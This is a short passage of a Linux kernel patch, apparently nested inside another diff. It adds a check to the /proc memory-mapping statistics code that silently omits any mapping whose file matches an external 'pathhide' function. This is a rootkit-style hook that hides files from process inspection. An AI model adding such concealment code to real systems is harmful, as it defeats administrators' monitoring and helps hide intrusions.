@@ -11,6 +11,17 @@
  
  	if (vma->vm_file) {
  		const struct inode *inode = file_user_inode(vma->vm_file);
+@@ -1303,6 +1307,10 @@
+ {
+ 	struct vm_area_struct *vma = v;
+ 	struct mem_size_stats mss = {};
++	extern bool pathhide_match_file(struct file *file);
++
++	if (vma->vm_file && pathhide_match_file(vma->vm_file))
++		return 0;
+ 
+ 	if (!vma_pages(vma))
+ 		goto show_pad;
 
 --- a/fs/proc/fd.c
 +++ b/fs/proc/fd.c
